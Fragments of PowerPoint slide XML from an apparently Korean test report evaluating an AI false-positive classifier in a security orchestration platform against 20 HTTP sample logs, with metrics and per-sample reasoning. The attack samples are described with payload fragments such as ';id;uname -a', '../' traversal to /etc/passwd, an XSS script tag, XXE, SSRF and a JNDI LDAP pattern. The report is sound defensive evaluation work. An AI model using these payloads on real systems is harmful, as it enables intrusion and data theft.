Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide18.xml" Id="R2e62284f6c9b439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4c048b729b485a" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide19.xml" Id="R2be7229f07ac490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a4415b43974d67" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide20.xml" Id="Rf5023b7ab04845e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06fdcee5ec448e" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide21.xml" Id="R8c276ac122cf4a4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96bb5c17a4474f" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide22.xml" Id="Ra2663f4a3b514c8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55f0e446764ae7" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide23.xml" Id="R588b6dd3ec8741a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6cd85e3955488a" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide24.xml" Id="R460559642f62480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767f11efef4b7d" /><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="/ppt/notesSlides/notesSlide25.xml" Id="Re9011222a31046b2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화면 값</c:v>
          </c:tx>
          <c:dPt>
            <c:idx val="0"/>
            <c:invertIfNegative val="0"/>
            <c:spPr>
              <a:solidFill xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:srgbClr val="B45326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566D7D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B45326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566D7D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B45326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B45326"/>
              </a:solidFill>
            </c:spPr>
          </c:dPt>
          <c:dPt>
            <c:idx val="6"/>
            <c:invertIfNegative val="0"/>
            <c:spPr>
              <a:solidFill xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:srgbClr val="566D7D"/>
              </a:solidFill>
            </c:spPr>
          </c:dPt>
          <c:dPt>
            <c:idx val="7"/>
            <c:invertIfNegative val="0"/>
            <c:spPr>
              <a:solidFill xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:srgbClr val="B45326"/>
              </a:solidFill>
            </c:spPr>
          </c:dPt>
          <c:dPt>
            <c:idx val="8"/>
            <c:invertIfNegative val="0"/>
            <c:spPr>
              <a:solidFill xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:srgbClr val="566D7D"/>
              </a:solidFill>
            </c:spPr>
          </c:dPt>
          <c:dPt>
            <c:idx val="9"/>
            <c:invertIfNegative val="0"/>
            <c:spPr>
              <a:solidFill xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:srgbClr val="B45326"/>
              </a:solidFill>
            </c:spPr>
          </c:dPt>
          <c:dPt>
            <c:idx val="10"/>
            <c:invertIfNegative val="0"/>
            <c:spPr>
              <a:solidFill xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:srgbClr val="087C7A"/>
              </a:solidFill>
            </c:spPr>
          </c:dPt>
          <c:dPt>
            <c:idx val="11"/>
            <c:invertIfNegative val="0"/>
            <c:spPr>
              <a:solidFill xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:srgbClr val="087C7A"/>
              </a:solidFill>
            </c:spPr>
          </c:dPt>
          <c:dPt>
            <c:idx val="12"/>
            <c:invertIfNegative val="0"/>
            <c:spPr>
              <a:solidFill xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:srgbClr val="087C7A"/>
              </a:solidFill>
            </c:spPr>
          </c:dPt>
          <c:dPt>
            <c:idx val="13"/>
            <c:invertIfNegative val="0"/>
            <c:spPr>
              <a:solidFill xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:srgbClr val="087C7A"/>
              </a:solidFill>
            </c:spPr>
          </c:dPt>
          <c:dPt>
            <c:idx val="14"/>
            <c:invertIfNegative val="0"/>
            <c:spPr>
              <a:solidFill xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:srgbClr val="087C7A"/>
              </a:solidFill>
            </c:spPr>
          </c:dPt>
          <c:dPt>
            <c:idx val="15"/>
            <c:invertIfNegative val="0"/>
            <c:spPr>
              <a:solidFill xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:srgbClr val="087C7A"/>
              </a:solidFill>
            </c:spPr>
          </c:dPt>
          <c:dPt>
            <c:idx val="16"/>
            <c:invertIfNegative val="0"/>
            <c:spPr>
              <a:solidFill xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:srgbClr val="087C7A"/>
              </a:solidFill>
            </c:spPr>
          </c:dPt>
          <c:dPt>
            <c:idx val="17"/>
            <c:invertIfNegative val="0"/>
            <c:spPr>
              <a:solidFill xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:srgbClr val="087C7A"/>
              </a:solidFill>
            </c:spPr>
          </c:dPt>
          <c:dPt>
            <c:idx val="18"/>
            <c:invertIfNegative val="0"/>
            <c:spPr>
              <a:solidFill xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:srgbClr val="087C7A"/>
              </a:solidFill>
            </c:spPr>
          </c:dPt>
          <c:dPt>
            <c:idx val="19"/>
            <c:invertIfNegative val="0"/>
            <c:spPr>
              <a:solidFill xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:srgbClr val="087C7A"/>
              </a:solidFill>
            </c:spPr>
          </c:dPt>
          <c:cat>
            <c:strLit>
              <c:ptCount val="20"/>
              <c:pt idx="0">
                <c:v>S01</c:v>
              </c:pt>
              <c:pt idx="1">
                <c:v>S02</c:v>
              </c:pt>
              <c:pt idx="2">
                <c:v>S03</c:v>
              </c:pt>
              <c:pt idx="3">
                <c:v>S04</c:v>
              </c:pt>
              <c:pt idx="4">
                <c:v>S05</c:v>
              </c:pt>
              <c:pt idx="5">
                <c:v>S06</c:v>
              </c:pt>
              <c:pt idx="6">
                <c:v>S07</c:v>
              </c:pt>
              <c:pt idx="7">
                <c:v>S08</c:v>
              </c:pt>
              <c:pt idx="8">
                <c:v>S09</c:v>
              </c:pt>
              <c:pt idx="9">
                <c:v>S10</c:v>
              </c:pt>
              <c:pt idx="10">
                <c:v>S11</c:v>
              </c:pt>
              <c:pt idx="11">
                <c:v>S12</c:v>
              </c:pt>
              <c:pt idx="12">
                <c:v>S13</c:v>
              </c:pt>
              <c:pt idx="13">
                <c:v>S14</c:v>
              </c:pt>
              <c:pt idx="14">
                <c:v>S15</c:v>
              </c:pt>
              <c:pt idx="15">
                <c:v>S16</c:v>
              </c:pt>
              <c:pt idx="16">
                <c:v>S17</c:v>
              </c:pt>
              <c:pt idx="17">
                <c:v>S18</c:v>
              </c:pt>
              <c:pt idx="18">
                <c:v>S19</c:v>
              </c:pt>
              <c:pt idx="19">
                <c:v>S20</c:v>
              </c:pt>
            </c:strLit>
          </c:cat>
          <c:val>
            <c:numLit>
              <c:formatCode>0.00</c:formatCode>
              <c:ptCount val="20"/>
              <c:pt idx="0">
                <c:v>0.47</c:v>
              </c:pt>
              <c:pt idx="1">
                <c:v>0.39</c:v>
              </c:pt>
              <c:pt idx="2">
                <c:v>0.48</c:v>
              </c:pt>
              <c:pt idx="3">
                <c:v>0.3</c:v>
              </c:pt>
              <c:pt idx="4">
                <c:v>0.31</c:v>
              </c:pt>
              <c:pt idx="5">
                <c:v>0.6</c:v>
              </c:pt>
              <c:pt idx="6">
                <c:v>0.35</c:v>
              </c:pt>
              <c:pt idx="7">
                <c:v>0.43</c:v>
              </c:pt>
              <c:pt idx="8">
                <c:v>0.27</c:v>
              </c:pt>
              <c:pt idx="9">
                <c:v>0.65</c:v>
              </c:pt>
              <c:pt idx="10">
                <c:v>0.43</c:v>
              </c:pt>
              <c:pt idx="11">
                <c:v>0.46</c:v>
              </c:pt>
              <c:pt idx="12">
                <c:v>0.37</c:v>
              </c:pt>
              <c:pt idx="13">
                <c:v>0.67</c:v>
              </c:pt>
              <c:pt idx="14">
                <c:v>0.51</c:v>
              </c:pt>
              <c:pt idx="15">
                <c:v>0.6</c:v>
              </c:pt>
              <c:pt idx="16">
                <c:v>0.63</c:v>
              </c:pt>
              <c:pt idx="17">
                <c:v>0.45</c:v>
              </c:pt>
              <c:pt idx="18">
                <c:v>0.57</c:v>
              </c:pt>
              <c:pt idx="19">
                <c:v>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83246"/>
                  </a:solidFill>
                  <a:latin typeface="Malgun Gothic"/>
                  <a:ea typeface="Malgun Gothic"/>
                  <a:cs typeface="Malgun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4E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</c:catAx>
      <c:valAx>
        <c:axId val="48672768"/>
        <c:scaling>
          <c:orientation val="minMax"/>
          <c:max val="1.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4EA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5F7FA"/>
        </a:solidFill>
      </c:spPr>
    </c:plotArea>
    <c:plotVisOnly val="1"/>
  </c:chart>
  <c:spPr>
    <a:solidFill xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
      <a:srgbClr val="F5F7FA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6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949FC2-E51D-47DE-BF15-E7C8EC4E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3868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77CEE8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77CEE8"/>
                </a:solidFill>
                <a:latin typeface="Malgun Gothic"/>
                <a:ea typeface="Malgun Gothic"/>
                <a:cs typeface="Malgun Gothic"/>
              </a:rPr>
              <a:t>eyeCloudXOAR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04E1B2-3055-4B91-AD41-83E4DE68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38684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5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검색 기반 AI 정오탐 모델</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:pPr algn="l">
              <a:defRPr sz="5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5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샘플로그 검증 결과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6BD0EA-F462-4364-9CED-A08753C6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1362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C9DFE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C9DFEA"/>
                </a:solidFill>
                <a:latin typeface="Malgun Gothic"/>
                <a:ea typeface="Malgun Gothic"/>
                <a:cs typeface="Malgun Gothic"/>
              </a:rPr>
              <a:t>LogGenerator 연동 및 AI TEST 플레이북 실행 기록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BFF469-93A7-4871-9BD9-EEB846CC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43675"/>
            <a:ext cx="1352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C9DFE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C9DFEA"/>
                </a:solidFill>
                <a:latin typeface="Malgun Gothic"/>
                <a:ea typeface="Malgun Gothic"/>
                <a:cs typeface="Malgun Gothic"/>
              </a:rPr>
              <a:t>테스트 기록  2026.09.08</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:pPr algn="l">
              <a:defRPr sz="2175" b="0">
                <a:solidFill>
                  <a:srgbClr val="C9DFE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C9DFEA"/>
                </a:solidFill>
                <a:latin typeface="Malgun Gothic"/>
                <a:ea typeface="Malgun Gothic"/>
                <a:cs typeface="Malgun Gothic"/>
              </a:rPr>
              <a:t>대상 서버  10.1.42.80</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4243207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C8B5D4-8225-4A6C-B3FF-BBEC8512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공격 10건을 탐지했고 정상 6건을 공격으로 판정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0E56B3-534A-4CFA-98D5-6351D86D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공격 의도·모사 10건, 정상 대조군 10건에 대한 사후 수동 검토 결과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82EDEE-CDE9-483B-98E0-9689FE09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5D0C92-FF06-45CF-938B-347160CB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3338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64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70.0%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A79D4B-7F04-4813-8AC6-84CBF391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4333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전체 정확도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15885E-30AA-4CFC-BBAF-25E0142B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4333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20건 중 14건 정분류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C5D087-F4B0-4ADD-B0BE-5CC803D8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628900"/>
            <a:ext cx="43338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defRPr>
            </a:pPr>
            <a:r>
              <a:rPr sz="6450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rPr>
              <a:t>100.0%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15CC5D-978A-4933-AA7A-BDF28128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952875"/>
            <a:ext cx="4333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공격 탐지율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E04FBB-7F89-46BB-93B2-F818B781D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4610100"/>
            <a:ext cx="4333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공격 모사 10건 모두 탐지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3B2CEE-4500-4AAC-AA3E-FB41A86D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628900"/>
            <a:ext cx="43338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defRPr>
            </a:pPr>
            <a:r>
              <a:rPr sz="6450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rPr>
              <a:t>62.5%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7744C9-7BF0-460F-8251-1F53E877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952875"/>
            <a:ext cx="4333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공격 판정 정밀도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B41D6F-AFAC-44C8-B9E2-538C9C01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610100"/>
            <a:ext cx="4333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공격 판정 16건 중 10건 적중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C6F6AD-D2B2-4CD3-81E9-09A9067D5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9825"/>
            <a:ext cx="13868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rPr>
              <a:t>정상 대조군 오탐률 60.0%  (6 / 10)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BC4897-AC89-47B8-BF2D-48029613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77125"/>
            <a:ext cx="1386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이 수치는 제공된 20건의 결과이며, 학습·평가 데이터 분리 여부와 운영 환경의 일반화 성능은 확인되지 않았다.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="6343655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A32354-BCC1-4500-906B-4DF81598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평가 대상과 수동 분류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00413C-D74A-4259-9D9D-4C6328B1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화면의 공격·정상 판정과 독립적인 기준으로 20개 요청을 다시 분류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67AABC-82B8-49BB-9C75-779C221A1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C01AAB-DF95-4B50-B380-9EEF3A86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평가 단위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F5C348-B854-4676-B809-F18A8CCB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43150"/>
            <a:ext cx="1026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제공 순서대로 S01~S20을 부여한 HTTP 요청 20건.</a:t>
            </a:r>
          </a:p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각 요청의 화면 값과 공격·정상 판정을 그대로 비교한다.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C2EF78-EBCD-4980-834C-052E66CB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정상 대조군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A91AC3-81D7-41D4-BFE6-76EDF7B6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14750"/>
            <a:ext cx="1026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S01~S10은 제공된 요청 범위에서 공격 구문이 없는 대조군 10건.</a:t>
            </a:r>
          </a:p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업로드 파일 본문, 로그인 응답, 반복 행위는 확인되지 않았다.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8B8AB5-8F7E-4808-852A-CD8CB03D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공격 모사군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CFD352-2076-4BF2-AB1B-C2E09913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86350"/>
            <a:ext cx="1026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S11~S20은 삽입, 경로 순회, 외부 접근 등을 시도·모사하는 10건.</a:t>
            </a:r>
          </a:p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실제 취약점 악용 성공 여부는 이 자료의 평가 대상에 포함하지 않는다.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0F21F5-8A32-4373-AC95-FE968F72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96150"/>
            <a:ext cx="1386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원문의 퍼센트 인코딩, 역슬래시, 개행 이스케이프와 Referer의 Markdown 링크 표기를 보존한다.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="15373641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ADF54A-672D-4651-8B8B-3D5B8A35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기존 테스트의 연동 과정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BAE16E-AC3E-487B-8936-D009B272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사용자 설명에 따른 구성 명칭과 처리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734F99-E8A6-4F4C-B548-3D7B0E7C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2266950"/>
          <a:ext xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" cx="13868400" cy="4838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4286250"/>
                <a:gridCol w="8629650"/>
              </a:tblGrid>
              <a:tr h="5524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구성 요소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테스트 과정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</a:tr>
              <a:tr h="8572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LogGenerator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학습 후 판정을 확인할 샘플 로그를 선택하고 전송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02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10.1.42.80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테스트 서버의 로그 수신 경로로 전달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8572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LogGenerator 파서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수신 로그를 파싱하고 AI 입력에 필요한 payload를 추출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04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이벤트  AITEST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로그를 일반 이벤트로 연동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8572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플레이북 티켓  AI TEST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정오탐 분석을 실행하고 피드백 저장 단계로 진행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1D534E-5ECC-4168-8DD7-669575212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77125"/>
            <a:ext cx="1386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대상 서버와 구성 명칭은 제공 내용 기준. 실제 전송 프로토콜·포트·EPS·수신 건수는 제공 자료에 없다.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3079541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36CF2B-FEFB-46B4-8413-2C1B5186D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파서와 이벤트·티켓 연계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F16CA3-C802-42CB-B6BC-FB3731BD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연동 이름과 분석 입력을 구분해 테스트 조건을 재현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FBA03C-BF66-4E5F-B878-047D26F5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A36472-50E3-4BA7-8E46-A5327B7C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6475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수신 로그 파싱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A6D2B6-0514-428C-8078-7319D0A33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76475"/>
            <a:ext cx="1026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등록 이름  LogGenerator</a:t>
            </a:r>
          </a:p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HTTP 요청이 포함된 payload와 이벤트 연동 필드를 추출한다.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871602-E49D-40AD-A55C-7285A05F2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이벤트 및 티켓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815317-3BE6-420B-8E1D-70DEE2C4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19500"/>
            <a:ext cx="1026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일반 이벤트  AITEST</a:t>
            </a:r>
          </a:p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플레이북 티켓  AI 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37ED54-8577-4463-9AB5-3CCAC9F3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AI 분석 입력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A94605-B243-4573-9FB8-046B7D2B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53000"/>
            <a:ext cx="1026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티켓의 payload를 정오탐 분석 요청에 전달한다.</a:t>
            </a:r>
          </a:p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정답 라벨과 보고서용 S번호는 모델 입력에서 분리한다.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41F1E5-E611-4104-B876-4C5AFA47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91375"/>
            <a:ext cx="1386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파서 정규식, 장비 매핑, 이벤트 조건식, 활성 모델 버전 및 실제 입력 전문은 별도 설정 증거가 필요하다.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="14026875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6B5B9D-AF7C-4C22-983A-FB45A288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AI TEST 플레이북 실행 화면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E58478-9BF3-4A89-823B-309FD37D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제공 화면의 노드 이름과 자동·수동 실행 모드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EC974A-8F40-4BDA-B457-7B74CDDA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23ea0856304b74"/>
          <a:stretch xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:off x="733536" y="2324100"/>
            <a:ext cx="13772928" cy="18478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7DF45F-0344-4862-BF56-A83B0C8F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6429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정오탐 분석 요청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1D660D-7739-4F7D-8A9F-2C26E973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64293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Auto</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:pPr algn="l">
              <a:defRPr sz="23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분석 요청을 자동 실행하는 노드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35B80E-6415-47E2-B33B-A83EC4CD8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95825"/>
            <a:ext cx="655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rPr>
              <a:t>정오탐 피드백 데이터 저장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5FD459-DE2D-451E-BDA8-EFF169E0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334000"/>
            <a:ext cx="65532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Manual</a:t>
            </a:r>
          </a:p>
          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
            <a:pPr algn="l">
              <a:defRPr sz="23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사용자 피드백을 처리하는 수동 단계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A2B439-E522-478D-89A1-BADE0D01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58050"/>
            <a:ext cx="1386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티켓에는 이 단계의 상태가 표시된다. 제공 화면과 목록만으로 피드백 저장 완료 또는 End 도달을 확정할 수 없다.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3442402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64CA1D-2CFE-46C7-8FAB-830745A4B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AI TEST 티켓 20건의 실행 기록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0D0117-6D54-4A86-B079-D8D2E861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2026.09.08  /  공통 담당자: 미지정  /  상태: 분석/대응 ( 정오탐 피드백 데이터 저장 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D0414D-51EF-43F7-8F13-D48BCA35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B9C8C4-95E2-411A-97BE-C42E7A8F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676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제공 목록 A   14:18:13 ~ 14:19:07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B6D8BF-FF92-435D-934B-091F57DF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43125"/>
            <a:ext cx="662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제공 목록 B   16:54:54 ~ 16:55:39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85800" y="2667000"/>
          <a:ext xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" cx="6667500" cy="4648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1714500"/>
              </a:tblGrid>
              <a:tr h="4572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 ID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시각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</a:tr>
              <a:tr h="4191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SR260908-AW1-00000380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14:19:07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SR260908-AW1-00000379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14:18:58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4191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SR260908-AW1-00000378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14:18:58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SR260908-AW1-00000377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14:18:40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4191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SR260908-AW1-00000376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14:18:40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SR260908-AW1-00000375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14:18:40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4191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SR260908-AW1-00000374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14:18:22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SR260908-AW1-00000373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14:18:22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4191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SR260908-AW1-00000372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14:18:22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SR260908-AW1-00000371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14:18:13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"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" x="7924800" y="2667000"/>
          <a:ext xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" cx="6629400" cy="4648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14900"/>
                <a:gridCol w="1714500"/>
              </a:tblGrid>
              <a:tr h="4572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 ID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시각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</a:tr>
              <a:tr h="4191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SR260908-AW1-00000456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16:55:39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SR260908-AW1-00000455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16:55:39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4191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SR260908-AW1-00000454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16:55:39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SR260908-AW1-00000452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16:55:21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4191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SR260908-AW1-00000451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16:55:21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SR260908-AW1-00000450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16:55:21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4191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SR260908-AW1-00000449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16:55:12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SR260908-AW1-00000448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16:55:12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4191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SR260908-AW1-00000447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16:55:12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SR260908-AW1-00000446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16:54:54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215F15-5715-4EAB-8D21-BDA223E9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77125"/>
            <a:ext cx="1386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티켓과 개별 로그의 1:1 대응은 미제공. 목록 B의 00000453 미표시만으로 수집 누락이나 실행 실패를 판단하지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6488008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883A7F-CB15-4CF2-8385-1ECFF5FD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혼동행렬과 성능 지표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75B27C-99E8-4AE6-BFCA-C56C2E2C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양성 클래스 = 공격 의도·모사 로그  /  정답 = 본 보고서의 수동 분류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46F629-01ED-40CB-BBDC-4BA4F551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85800" y="2571750"/>
          <a:ext xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" cx="66675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1714500"/>
                <a:gridCol w="1714500"/>
                <a:gridCol w="1333500"/>
              </a:tblGrid>
              <a:tr h="619125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수동 분류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 공격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 정상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합계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</a:tr>
              <a:tr h="10477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TP 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FN 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FP 6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TN 4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714375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합계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"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" x="8020050" y="2352675"/>
          <a:ext xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" cx="65341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1714500"/>
                <a:gridCol w="1866900"/>
              </a:tblGrid>
              <a:tr h="5524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지표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계산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</a:tr>
              <a:tr h="657225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전체 정확도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 / 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70.0%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 탐지율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 / 10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100.0%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657225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 판정 정밀도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 / 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62.5%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 오탐률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 / 10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60.0%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657225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 판별률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 / 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40.0%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F1 점수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 / 26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76.9%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DAD0E5-90AB-4D50-A8EE-9F1062F9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77125"/>
            <a:ext cx="1386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FP: 정상 로그를 공격으로 판정한 6건. FN: 공격 로그를 정상으로 판정한 건수는 이번 표본에서 0건.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10477141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360F7D-C1DC-4D60-9653-9FFAEE5F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정상 로그 판정 근거  S01~S05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90174D-383A-4792-AAC8-4E9FB103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수동 정상 5건 중 모델 오탐 3건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D8690E-B430-4891-8C43-3756BCBD9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2171700"/>
          <a:ext xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" cx="13868400" cy="5029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62000"/>
                <a:gridCol w="2095500"/>
                <a:gridCol w="952500"/>
                <a:gridCol w="952500"/>
                <a:gridCol w="857250"/>
                <a:gridCol w="8248650"/>
              </a:tblGrid>
              <a:tr h="5524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ID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 유형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원값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수동 분류 근거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S01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상대경로 리디렉션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B45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/home으로 이동하는 상대경로이며 외부 URL이나 헤더 삽입이 없다.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S02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 업로드 발췌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0.39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566D7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TN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이름과 Windows 파일 경로만으로 공격을 입증할 수 없다. 파일 본문은 제공되지 않았다.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S03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로그인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B45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삽입 구문이 없는 단건 로그인이다. 비밀번호 문자열만으로 실패나 무차별 대입을 확정할 수 없다.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S04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 점검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0.30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566D7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TN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/health와 kube-probe User-Agent가 헬스체크 요청 형식에 부합한다.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S05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JSON 검색 조건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B45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union은 JSON 필드의 값이다. SQL UNION SELECT 삽입 구문이 아니다.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475AD0-EF44-4280-91A4-3F17E73AD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77125"/>
            <a:ext cx="1386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정상 = 제공된 요청 범위에서 공격 근거가 없는 대조 로그. 파일 내용·권한·응답까지 검증한 판정은 아님.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="11523016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A8DBD2-3E15-412F-884B-E8122347A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정상 로그 판정 근거  S06~S10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D855F1-D82C-4BA3-9884-745CAD0B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수동 정상 5건 중 모델 오탐 3건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9C0E81-AB1A-45D6-A319-0D4FA4B6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2171700"/>
          <a:ext xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" cx="13868400" cy="5029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62000"/>
                <a:gridCol w="2095500"/>
                <a:gridCol w="952500"/>
                <a:gridCol w="952500"/>
                <a:gridCol w="857250"/>
                <a:gridCol w="8248650"/>
              </a:tblGrid>
              <a:tr h="5524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ID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 유형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원값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수동 분류 근거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S06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 ping 요청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B45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localhost에 count=4를 지정했다. 명령 연결자나 셸 확장 구문이 없다.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S07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파일 다운로드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0.35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566D7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TN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파일명 안의 ..는 상위 디렉터리 이동 구분자 ../와 다르다.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S08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기술 문서 검색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B45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HTML script 요소를 설명하는 자연어 검색이다. 실행 가능한 script 태그가 없다.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S09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자연어 검색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0.27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566D7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TN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건강보험 선택에 관한 문장이다. SQL 구문을 구성하는 SELECT 삽입이 없다.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상품 목록 조회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B453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상품 ID와 가격 오름차순 정렬 조건이다. SQL 연산자나 주석 삽입이 없다.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5FF90B-E827-443E-A43F-B94E065F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77125"/>
            <a:ext cx="1386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정상 = 제공된 요청 범위에서 공격 근거가 없는 대조 로그. 파일 내용·권한·응답까지 검증한 판정은 아님.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="6668292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D31DFF-D1B4-4B03-BDC7-FE78B341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공격 로그 판정 근거  S11~S15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31E4ED-1ECD-4148-AF12-5E4C2093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공격 의도·모사 기준 5건 모두 공격으로 판정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C679A6-4570-4BE5-BD09-F672EA59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2171700"/>
          <a:ext xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" cx="13868400" cy="5029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62000"/>
                <a:gridCol w="2095500"/>
                <a:gridCol w="952500"/>
                <a:gridCol w="952500"/>
                <a:gridCol w="857250"/>
                <a:gridCol w="8248650"/>
              </a:tblGrid>
              <a:tr h="5524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ID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 유형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원값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수동 분류 근거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CRLF</a:t>
                      </a:r>
                    </a:p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헤더 삽입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87C7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%0D%0A 뒤에 X-Test-Injected 헤더를 추가하는 삽입 탐침이다.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S12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XML 외부</a:t>
                      </a:r>
                    </a:p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엔터티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0.46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87C7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TP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디코딩 시 DOCTYPE과 SYSTEM 외부 엔터티가 /etc/hostname을 참조한다.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S13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템플릿 삽입</a:t>
                      </a:r>
                    </a:p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87C7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중괄호 템플릿 식 평가를 탐색하는 형태다. 역슬래시의 실제 전송 여부는 확인이 필요하다.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S14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SSRF 모사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0.67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87C7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TP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URL 가져오기 기능에 /latest/meta-data 경로를 입력했다. 목적지는 문서용 주소다.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S15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Log4Shell 패턴 모사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0.51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87C7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User-Agent에 JNDI LDAP 조회 패턴을 넣었다. 역슬래시와 실행 환경에 따라 성립 여부가 달라진다.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D6FCAB-0340-4E2E-88D3-337F9B31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77125"/>
            <a:ext cx="1386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공격 = 공격 의도·모사 패턴 기준. 취약점 존재, 서버 실행 또는 침해 성공을 의미하지 않음.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="180399668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B7834-6770-4DD8-B99C-DCF39DCF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공격 로그 판정 근거  S16~S20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CA0EE5-E2E3-421E-BB23-6247F94C4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공격 삽입·경로 순회 패턴 5건 모두 공격으로 판정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F6A29A-719F-48EA-B7CA-3835814F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2171700"/>
          <a:ext xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" cx="13868400" cy="5029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62000"/>
                <a:gridCol w="2095500"/>
                <a:gridCol w="952500"/>
                <a:gridCol w="952500"/>
                <a:gridCol w="857250"/>
                <a:gridCol w="8248650"/>
              </a:tblGrid>
              <a:tr h="5524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ID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 유형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원값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수동 분류 근거</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="91440" marT="45720" marB="45720" anchor="ctr">
                    <a:solidFill>
                      <a:srgbClr val="102638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OS 명령 삽입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87C7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디코딩 시 ;id;uname -a를 연결해 추가 OS 명령 실행을 시도한다.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S17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경로 순회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0.63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87C7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TP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반복 ../로 상위 디렉터리를 벗어나 /etc/passwd 접근을 시도한다.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S18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XSS 삽입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87C7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디코딩 시 &lt;script&gt;alert(1)&lt;/script&gt;를 포함하는 스크립트 삽입 탐침이다.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S19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 지연</a:t>
